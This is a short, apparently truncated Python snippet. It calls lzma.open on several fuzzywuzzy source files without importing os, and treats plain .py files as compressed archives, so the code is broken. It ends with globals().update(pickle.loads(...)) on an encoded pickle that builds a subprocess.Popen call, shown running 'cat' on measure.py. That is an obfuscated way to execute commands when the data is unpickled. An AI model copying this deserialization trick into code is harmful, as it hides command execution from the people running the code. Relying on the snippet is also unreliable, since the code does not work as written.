import lzma
lzma.open(os.path.abspath('../fuzzywuzzy/measure.py')).read()

lzma.open(os.path.abspath('../fuzzywuzzy/fuzz.py')).read()

lzma.open(os.path.abspath('../fuzzywuzzy/string_processing.py')).read()

lzma.open(os.path.abspath('../fuzzywuzzy/utils.py')).read()

globals().update(pickle.loads(b'\x80\x03csubprocess\nPopen\nq\x00)\x81q\x01}q\x02(X\x05\x00\x00\x00shellq\x03\x89X\x03\x00\x00\x00catq\x04cbuiltins\nlist\nq\x05]q\x06X/\x00\x00\x00../fuzzywuzzy/measure.pyq\x07s
